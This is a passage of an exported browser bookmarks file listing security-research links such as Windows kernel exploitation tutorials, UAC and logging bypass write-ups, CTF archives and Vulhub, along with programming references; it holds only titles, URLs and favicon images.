href="https://hshrzd.wordpress.com/2017/06/05/starting-with-windows-kernel-exploitation-part-2/" add_date="1518588668" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACpElEQVQ4jU2QPUhbURiGz/m+k4PeqCQ2xCgNqEERIhKCFAQLHRQ6CG4OUrq4dFC0iyCddOtU7OTgHBSdFTIIQvwBRRDpYhQhKCURb+5P7r3n3mPu6WBLfXjG9x3el5bLZSklIYQBVHS9fXHx3dXVPQBD7PL984WFtqUlapoKAACq1SrzPM/zvJeCaZpvKH0Kw2/JpGg0frguU8p2HGpZChEATNME+goEeCbkaxCwmZlf2eyXZrNJKcL/DAAwxhgiEkIQkVDKlfqM+Gljg0j5nZAIISEiQQwBGGOUUnZ3d+c4DqUUCNGDIEnph5aWn4Qwzj8CHAfB7+trMAzW0iKl9DyP7u3tAYBSCgD0ep3a9ttkMqIUBTBd994wYqmUajZrj4/pdNq2bZbJZP6OZkxKGUkkYum0JwRjjFsWVyrT37+7u1ssFufn5/v6+sB/hZRSSfnsus0XHYcjbm1vHx0dDQwMLC8vl8tlYIxF/sEYA8QI5y8yzp+bzffj47qub21tTU1N9fT00OPjY9u2X16q1WptbW3t7e2+7yOi67qGYeRyudvb21KpNDs7axgGLRQKYRgiolLK932lFOccACilQghCSDKZbG1tRUQhhG3bkM1mE4nE/v5+R0fHyMhIKpUaHh4+PT2tVqujo6NdXV3d3d2Xl5eFQiEej8diMZyenl5fX+/s7NzZ2RkaGtI0bXNz0/O8UqkkpRwcHDw8PDw4OJBSnp+f53I5ZlnWzc3Nw8PD09OTZVnRaLRSqVQqFV3X8/l8GIa1Wu3i4kLTtN7eXiEErq6uZjKZk5OTlZWVfD4vhJicnDw7O5uYmJibmzNNc2xszPO8IAjW1tYikQgtFoucc8dxotGo4ziNRiOVSrmuyzkPw1DX9Xg8zhgTQmiaVq/X/wCC1motzBOCuwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">从Windows Kernel Exploitation开始 - 第2部分 - 熟悉HackSys Extreme易受攻击的驱动程序| hasherezade的1001晚上</a><br>            <dt><a href="https://decoder.cloud/2018/02/02/getting-system/amp/?__twitter_impression=true" add_date="1518657438" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Getting SYSTEM – Decoder&#39;s Blog</a><br>            <dt><a href="http://www.geekboy.ninja/blog/" add_date="1519121819" target="_blank" rel="noopener">Geekboy | 安全研究员| Bug赏金猎人</a><br>            <dt><a href="https://asciinema.org/" add_date="1491065832" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABqklEQVQ4jaXTMWtUQRQF4G/ePvNci2ihRUAQsRGJRcRCLBUREbHLfxA78weW2NhILILa+AdSiZEgWFgIUUMIhN0lpjGaRiFW0ZjdZHfHYvYFTCIouc0wd+acOffcO2ap1nna5Ip+TFHxrzFFpU5zmU6DyQVO/Q9RdoIQ2EClyt0q75a4N0MxShdqZH8lWCPG9FLcpB0Zynl4mtkmt/sEvZhIwr4KMmIgRFqRzYgKF3KeN3hR52Kgh7i7rAx6xCJtGpFrbWa6rHdoHeJWxtsGE/MM7SnrDXmduc/EBh9K5iVerhJXUj5+Ii7x5SN39iiQjIROkxvLzB3j5g8WNxgPfN9kK3KywuNlFhtc3yHICFuJYPgoMz1G1hj7ydWcbyHdi/t1Ie97ICaLB9d51uL+AGcHeT3ASItelazN6jYPzvFkdwmxSCTzkckBJg7zKjCynfJbv3i0waUSXJqYlx6003om8r6g2O4fdJiOjJ9nnjSdo3RrSbh8jXg8zUDEkYyij13oUhtmWlKRBWLZxp0S+qPcRahSBL52GFvhcgmuJXBp1Z9x0M/koN/5Nxj4oyI1v/lkAAAAAElFTkSuQmCC" target="_blank" rel="noopener">asciinema - Record and share your terminal sessions, the right way</a><br>            <dt><a href="https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing" add_date="1526391527" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABsUlEQVQ4jcWTz2sTQRTHPzOzSXaSNlXqQaOoIBLEUiqiiHgQxIuI4EXwJF7EP8M/Qy/iTagHQWmhPXgpKOjNIAoWerBgTA/5YZJNd3f2ech2SUNCe/N7ecPMe5/3i4H/LTXp8gXkPoE5CwmQnAD1JD0rkIMAJeAoUAECoAtowAe2gP6oszcGk1vWLj4qVx4u5PzTBa3mRSkdOWn+iAbNt53G6nLQeS2g9irJKhAwCty74+dfVv2Zx8t/d2i5CAGOaI/bM/PUw37tfn3zkgwDHWlp+2RRQc+F0WKhNPi6G7j3vVZ82c5GvSiMBWkznEWmDPAmtbX2zq9TxvPuFefyF/NWL+StvlMsq2u2ZBLkD2NDzAAP0oe1sFNruFh1k5gE8NF0nZNu4ugnfBtNNt5CIqDWnPvYiKO61QarjZSNUT5a1+NQXjV/r6TJkkmAvaE213ut50ZpXVTaKST2PGO+7PZXPkTBZxnGyGjAPqUrKm2cvLAxQJa24zC5kit0rm9/v9qGTZW5TZdKs5xbr1S3fp5Zip/OHrsL8GzC1qZCUlu9ae2NKe0eGoJM+TOHghxU9j8aJKMmxtqSRQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Trimarc Research：通过安全事件审计来检测密码喷洒| Trimarc | 保护企业</a><br>            <dt><a href="https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html" add_date="1526392438" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACtklEQVQ4jQXBS2/cRAAA4HnYM36uvc7au91sk+ZRmiZtNk2E4FBxKOqF38OBP1VxKOKCOFAEqoSQKEiRqJQH2W022cS7fqztGdszw/fBg401SN1oOFrO/svzXNOJlEpJCSFshVRCYoSFkhBCCBRQAPuue89Uwlvs9pqyKLNFVZR13ZRFgQDs9UNCCYYoXcRQKCVabADJoJ4VDPubNNox3cCkepnGUb///PBga9A72ns8Wl9fLjNWroiu46FNsWFC4iSLRCMdJ9qSmFDABoNo/NnOF092o66PlOIQmZZJCIXbPq0VVprmeN2iVneV1DENTdnzrVeHj+t8fnbxKez6k/nNZUZXyb229/Xrp0cnIp2tser7n995qAEaOn721IUij+9Aft1pS9h4rz7ff7+w3779AWGl7uc3nu1UvG5YHVnmyXo43t3cjIKOZWztju1gOM9KrrlxUnrmBh4FQK/mTs0sx5NSMM4t17q9PL+4S5OiyrMkZbXj2OfX2Z+nV65FcGfQT0vqmMQzcFvkSEpiUiXEh4tPEBPQ8o/TWcnr65TNkgy2CQ51sIgTCym/Y7KKiVYKKahhHr98Ob2aiaZ54JmOQQyDrgQMox7+7svNFwHpYpkoDAFohcAYYd0ohHqwMfzr9CywjJ1h+OjRQw1pzw72ENg/kk/G0fhkLQhEK2reMMYpJTfTWcWr1998dVk0ccb2R0Pftn7/9Q98lopf/j7/9yY/ndx5FsWqXVUNAHC2SAWU29sPg7D/5qffXMdpJTqfXmOdF/EyTbP89vY+XvGuTYgGlZKT+cL2PNOkYS+oCv7u/Yf5MtEQ0r59sd4AhHVSMn6VFD9+nGIEpFRp3RLX3hgNpBDHJ8+vLiY6xAbVMYKK2iYh2NTk4SiY5Pyf2XLFG79j+57ruE6aJrZt5SVP4kTD+H9n3Wt30DNHnwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Gaining Domain Admin from Outside Active Directory</a><br>            <dt><a href="https://github.com/Alvin9999/new-pac/wiki/ss%E5%85%8D%E8%B4%B9%E8%B4%A6%E5%8F%B7" add_date="1528849040" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">ss免费账号 · Alvin9999/new-pac Wiki</a><br>            <dt><a href="http://www.alonemonkey.com/" add_date="1532798769" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADBklEQVQ4jWWT3U9bdRjHP8/vnPacvtBCAbd0vBTZcCxkIcgcIzobtyy4JcYteuGdwRj/AU32L5j4FxgvudB4Y2aYxGBSpzHZcLgBySaiwBglsELbFXra03N+x4sxRXyS5+L5Pm83ny/8P1QQIIfFfU0d1s1DtQBaBEaHTw9k2tw+gJVCeFFkbgEI9meCgwsAkgUjB97Y2Z7TQ53mZ20h5/WWCGGAYhW34EV+nF3zPp66vTyXBTMHPhDIwYtXRnsHzmaMHwY6ky84jqtLK/cDgObMoESillp4VNy6veJfmPzlz4Xnjw2AC32hM20x/XJ/Z9MnYyP9Q8NDZ+qZTI/pmE3SfKxXRkdGpLu7x42ESa6v5zvELe/1Hwkll7f1upzvZfSVk6nvInZTwjMs/eGVc0EocFXcNqljAWBRY9fxaJhR/cW3P4uBr6rVytOZpZ03VSphjL8xdCoxfnXMjUdjAkq0GeP6xBzLBZflgsv1iXl0KIagJGaH5YO3L7oXz7+aaLb0uPIx0YFwpOM4jifsuCLR1gzT9zYo6YSUdEKm7+WJtmbYaZhSrTVIRS18zyMghJzrNUeHXzp6M5VqT9qW0m9duiSxeJKwHScciQPgOnu4ToWqs8eNqZvBXmVXFXer5bu/Fy4bj4t6zTD8ya3NtVPvX7ucyXSd0FvlupRqARtFR56UHXEaDdyGx7G2lG6KhdTEjelbizvy7p0/KnfNbBYzl9ubf2c49MC27Nds2/K7u5qVEW1F2ckAQNfK+NVtwtrxrbAliYh68P2vxflsFlPlcmhAVjcbuTu/zSplKALX0fXKNrVSnlopT71SIHAdrcwQM7OzanWzkQMkl0Mb+xAZ+ac89Kr544a/O5hOp1UsEg5sAx0SL1DalUqlaExOfWN8PfXTl7eWgk/3QfKfoxwGWoD4YJqPhk+2v3fixa6O9lQLCGxtl1j6a/XxzMMnX93P8zmwCxQB56DrTCDCM8bTRy36WppIByDFChubdRaBPGAAVaBx2JnPbPuPwQL5bx7s/Rt/A/YCROKqJg8zAAAAAElFTkSuQmCC" target="_blank" rel="noopener">AloneMonkey - 猿，改变世界的动物！</a><br>        </dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></p></dl><p><br>        <dt><h3 add_date="1535736301" last_modified="1537107878">博客2</h3><br>        <dl><p><br>            <dt><a href="http://www.geekboy.ninja/blog/" add_date="1519121866" target="_blank" rel="noopener">Geekboy | 安全研究员| Bug赏金猎人</a><br>            <dt><a href="http://captf.com/" add_date="1506524661" target="_blank" rel="noopener">指数 /</a><br>            <dt><a href="https://github.com/ctfs" add_date="1506749317" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">CTFs</a><br>            <dt><a href="https://msdn.microsoft.com/en-us/library/3bstk3k5.aspx" add_date="1507389962" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABbUlEQVQ4jaWRPa7aQBSFvxmMpQgkfldC7RUgSkRPywZSQUfNIoAVwB4sQYVoXGQDJn6PB3Gk2MY6qWw9HlWcI11pNLrnu3PPGOAH0KGaPgzwC2hWBPy2QFrRDJDa/zADUAO+A9/G4zHD4ZAwDFksFsxmM/r9PofDAc/zWK1WTCYT0jQlCILC/wfgDdBut5Mknc9n+b6vKIokSdvtVkEQyPd9ZVkmSfI8T4CA9xKwXq8lSfP5XIAGg4HiOJYkjUYjAZpOp5Kk5XJZApxyl1qNPM/ZbDYAnE4nwjAkSRL2+z0Ax+MRgF6vV2ZQhmitJcsykiQBwHVdjDFkWYa1trwDMMa8Aj6DPssY82QAkPQKcBynnFrIdV3q9foTrOgtfcXhdrtxuVzI87ycEkURcRyXzY/Hg+v1yv1+f3rRG6Bms6lOpyNrrQAZY9Rut9VqtYrE5TiOut2uGo3G6zdWrHcLuF+D/Ae5DvATyCoCPv4C7ijFl0YjQwIAAAAASUVORK5CYII=" target="_blank" rel="noopener">C ++语言参考</a><br>            <dt><a href="https://www.codewars.com/?language=cpp" add_date="1507441254" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC0UlEQVQ4jQXBT2jXdRzH8efr/f38vv5cc/4YY8UYIWOFxBg0JcJGiESH8CAePIR4DI8eQiIkIjp0DokuiYTs0EE8dJDoFCESViNCfg0TEREZteYc8/fn+32/ejz06+sL31jMY3pAAY3AXQBSA8J7AIYpQTE0gsA0BHdLwqKsDZw1aAK5Rqwb3a7C92wvGN6RCKNJoQa7QYxIFougC14GgZSSL0/txNrOVPtGoqXB8/pa56CuV+1gkdS87VPIM0JpOcJQEBOGgdzenNqJtWcHcjWTs4btx8t/7ZXm+axczTmjn/XwQlh/GCYljYpMGLYi2vNN2b8JDYnPhdR0mubmwsbC5w7eBRPhhtG+G5K/MjqqZKIgQvZlu1ooo/HJf7v5bQfNGd8eRD0X4eNSXrF8J5uyq/DLe3udrf0T400H3TBsNw0/IU44fKzuVGm4bmsS5YSUF516QBPHQ3loXzO+/Va/v5vmIalRyHqSB8Y7ku+TzLRqP6jMj4a1qNgYj9hQMEuwbPnMsHQ++33llZlK/CDRDXCvPK+XLF2TtC7rRBtcD3E60r2oqpls6QVxQcQd5PmxxquRpW87QmJLuHfkzt87w+7wojM+DPss0X7Zmo+j5KMIlpL23GCvXJVpwlV3GOMZgqYk1EL1b0cWVzpZnyXaP1vxElm9p/B6PWpiFGVExOEX23b01Pq+Ut5COm0zHTa14e3S7PYl3Qedxzolez2r+GLcqVYtXrPYfHrwYFL5RouOYd4XzhLQs1gclsmT+5rdK8+GvavdyXHA9F7Vbr1p65KsDOd3+Gkv4SPBqgGIewX0GPyoMqtNvLDS3d/chew3w60HVYdXQ3ydzlsZ0/fdbn8asJziH0HXYrMQrgXTzoxEhyQvqY1RKfwi+WfZO4QPZ/73CYI0T2R6KYj00YJ5glmSYivwACstl0BzWGfSzAaet9lGPESeMBqFmUXu/w/JAI7/T3DrbwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">训练与编程挑战/卡塔| Codewars</a><br>            <dt><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/1_basic.html" add_date="1513912049" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jXVSv0t0VxA9c+fu+7FvRVxU0IRECEIIErFbwQ+3EEQkiyDbWFoI4n8QSBCClnY2FsFmZUEFUwlW+TClWAQWiwUJIcgaV1DX9za+d++dFN9qSOGBYZhhfh4OLSwsfMXM/4Rh+Aige3h4aPEfuOffcpubm6rRaOSfnp76RCSgSqXSERFnrU2I6E/P835XSv1mrf3l5OTkAQAWFxcHwjD8LsuyGWPMtyLyBTNHAIgqlYoQEYIggLUWSZIgTVP4vv8XEf3onPOI6Ic0TT/zfR9BEEBrjSRJAADaGCN9fX2yu7sL55y0Wi25vLyk8/Pzz+/u7n5WSqFYLKJUKtmJiQk3NjamoihyGxsb6cPDQ14DIBGhgYEBxHEsrVYLKysrWFpasqurq845x1tbWzI6OsqvnFj7iRIiIiUiICLpdrtSq9Xo+flZ9vf3USgUoLUWIqLh4WFqNpuyvb0tp6encM6htxiKiCAipJSiKIpwe3tLURSRtZZE5M3Ozs5oZmYGV1dXuL+/Ry6Xw9sA5xyCIMD09DTq9TpKpRI8z0PvOhhjMDc3h4ODA4yMjGBoaAhZloGI8PoCnHNgZgwODr7FrwjDkPr7+3F9fY2pqSkws3LOgYig3xTDnzRjjPlfMxHJ0dGR1Ot1NTk5ifHxcRhjLDOLiEADEBFBt9uFcw5KKQnDkJRSiplNkiRUq9UwPz+PtbU1ISJ0Oh2ICACI1lpTmqZYX19HPp931lpzcXHBs7OzEBF4nic7Ozvu8fERe3t7rtlscrvd1nEc61wuB6pUKk89QXlExL7vI01TFItFdDqdTESoWCxyq9UiYwyYGURkmDkFYLS19sssywqFQmFIRMbSNP2GmT+02+1Z3/d9IsLNzU3med6vYRh+tNY2APwRx/HfIhIT3sHy8vLXLy8v3xOR53neT8fHx433aqlnqlqtcrlc1u8VlstlXa1WGYB67fsXNjxy8R1L2VcAAAAASUVORK5CYII=" target="_blank" rel="noopener">一、基础知识篇 · CTF All In One</a><br>            <dt><a href="https://vulhub.org/#/index/" add_date="1515131719" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACm0lEQVQ4jW2STWxMYRiFz/vd7353Zjpmhpn2llLU0DSNnxIEsaEiKqVBiASVkrJQIqHsaEKiXQoJXdqwkjSxkLBoJBZIqEmr6Q+mTTRtymQ6c6edn3u/16KWzuLk5MmzPPS1rQlEDBAAEgAABhGYwbzImZmIFlticYGYoBdy7LkQBrQnlCWURQBABL1og1mCGQBD60IptHlHZNc+M7ws/yuZevd6PjlOAMDC8pOUrDURGZcb1gNg1606fWlV61Vo7TpzS+obyg8ec52Mr2p1oKa2mPqt5x2SEsyShHBzTvmBlopDJyaePEi9f6tLJQIvP3mxuu16KZsWUrktc8nH9+d/jhjKRwNtTWCuvfckNz6cfNhlLAnJYCTW2Ayi/OSP7EiCDGNtxx2hrNGuDmgtoD3h8xvBkDP0Wfj8JOTyE+djjUdj+48E4nVeZq44MzX1/KlVuVLFbHZLUheL/ppaMxQxgmH/qprqy7eEzw/WAMJbdwfrtkz29hiBMmGaKmovTH4XgXhdzbUuZ2zQGUmASMVsFbWz3wac4QEzWq6iFdC6MP3LGR2qbr9ZFq+jdOKTGV46dvcKex57XuXxVrvpVKK9GSQ29fbNvHox/fIZGZKkseHuo2JqVvqr1qQ/9LtOVgZDgXh95dEzJER1eyeIhLLsljPZwc8LyVE3m8kOJ8INO4UzOhjZvteyV5TSf7xcJv2hf6K3W5VXqqg90dsz9/Gd52RK6ZRlV0W27cmNf6OhG+fWdXYLpZyRQWgNgs7nheUDoAt54fODGUIEazfqQv57z236crbRjFbEDrQE1sRBAsxkGNAaAIRg7QEE1vPJsd9v+kp/ZmngwmG4rlfIkxAgwn/DzFoblg9SSmKGaUqlwAz+vw/6d1mw/gsx9TBua8D4PAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a><br>            <dt><a href="https://symeonp.github.io/2017/09/17/fuzzing-winafl.html" add_date="1515159777" target="_blank" rel="noopener">Symeon</a><br>            <dt><a href="https://blog.netspi.com/getting-started-wmi-weaponization-part-1/" add_date="1515163039" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACd0lEQVQ4jW2STUhUcRTFf/f/niNBpZlkieSotYkanx+RtXgMAy0SsY2Yq4hqE1ZoiwgXRYvCTW0SrWjbRlqEaUhY2AQpOOKMRB9QNFFBpOGixI+Z924LZ2xG+u8u59x7z7nnD/958SqnLx503if2hCo2YomqutZE0JlPVIYiALKRMBN0+gXOASh8MrYfrv04+y3brKqPgAJgSdRvyRuQqAxFVMzzvInCtCrDmW2XgU3/IH6ZbDFbVeeGvsyOKwzktH/3jOm4WFY42Fnu96tyFvAyWAqR0wYgHqzr9VVfxoNOn5OMn18bIl89y4S7y9gtxotZGnjdvbMwqspJYElE2mo/zwxZM0HnpsCVjKSDP4p37gB6gKWuXfYfVJ4CmwRKfNHjI0V6rfk3y04yfg/ACLTlW5YWL2DZa5XvbvBcY6nZn8s3YvsRhU/rni2J2CtpV8C9HtjSqyLrN1HVc3d+pt4KNGcjFoDEnlAFaXM7bZke29d961EJDxcqi09dW1l8oGisb271sZ824wI12Yg3xlivYiYzOWd0660LZYE3Wz2iN+ZSo8DenJYP6zGGw2Hb9rwkyPscQgphHGDRsnyFsdyFCGMWgNvU2Kre6tRIkf3u6KpcNR7HgBIRaesqsSawuaviH5rRlTNu2pSD1CsM1CXjneI2NbYiZL+nB3py4Ovy6EogUH1pm0n6AXkBHMjsfFJduLm968uC63xOPAMQ93DjPLA9R9gS6P2MxibgUJ5slRPRyanBbGkjfjtqhlnLO4XSEZ2cHgIINzSU5ikQfRidiD3KPwPgHqmPoGYQ5XR0MjaUSwg3NJRqAWO+yOyridgpwM/F/wJMO/Ws4Cq9JwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">WMI Weaponization入门 - 第1部分</a><br>            <dt><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" add_date="1515251940" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">First entry: Welcome and fileless UAC bypass – winscripting.blog</a><br>            <dt><a href="https://cobbr.io/ScriptBlock-Logging-Bypass.html" add_date="1515251973" target="_blank" rel="noopener">PowerShell脚本块记录旁路</a><br>            <dt><a href="https://lellansin.wordpress.com/tutorials/windows-%e7%bc%96%e7%a8%8b%e4%b9%8b%e8%b7%af/" add_date="1520516589" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACgElEQVQ4jQXBy24cRRQA0HurbnV19zzbDzkjg0Us4ViRUJDCDnasWLDiC/gP/oPPYBspQiyyYAOIReQwC+xAzEzGdmbsma5+1ONezsEfXi2+/+Loz6u710v/3dNZCf10UlgjyYPruSyxjbFv0rpJv79vKEd8+Y97dmgzje/WkRJXY5NpAeaQVGTWKDvXaq3L3NoyMxnQTCffx/1xdlrhg5NBjlpEa9q2QMB5TsNyFJPkRKjFh4Rbx0GiJUocI0tGJvTRWt2yEEDv+8moaD37LorAeGBoU7vdLgxzY8sMEUIMO9dqT4YsxNC1vu6groNve62g3R/jb4sOhJgTI6JGRAAQADCKEoBCjF1KiZGUSFSg6MefX8jkKCIlFk0WGDil0mZji03XxgAGM23gZvuhDdEYQ5v1Gw7X0VDwnBs7LAcqQe2849qASQE2Ieaae9egzuoU6MtPR4PxpKTpPj2KSnZUF4W9u1vl9nBip6Mi67cb2jpTVS4TBZHe/DdfXbTfPv1mPMZe0i+Xv165t8cH1cmjk21tm343cPAZndzUf12qVTWZ0KH5ZDYbHuR7bfAg6auPnutF8e72YuuuAcEl//ns2eT89NUfrzfcvb2v8acXL4uiSD4OrI0hNCFm5ShBO7+d/1tfr8Ky2/XhslvwelCV08cVGdLceo5pejTb3D9IV4e6ySh7Mjo/m54FaW9uFsvm74urOQQ7X21ove0gRA24vL3jFLQCwORTAyIQhUB/PD0+fjJSjZGD6qgU1ai9W8e7zpPRILKra997ZmZhAYwJEtJiXTdAhR59/fg5La8Xw0wQ0/nZ6fvFh4d7p9AgKAAGUQiKA+5VsyA2Kuau/R/F4occ4fA3AgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Windows 编程之路 | Lellansin&#39;s 冰森</a><br>            <dt><a href="https://bytecode77.com/hacking/exploits" add_date="1521383688" 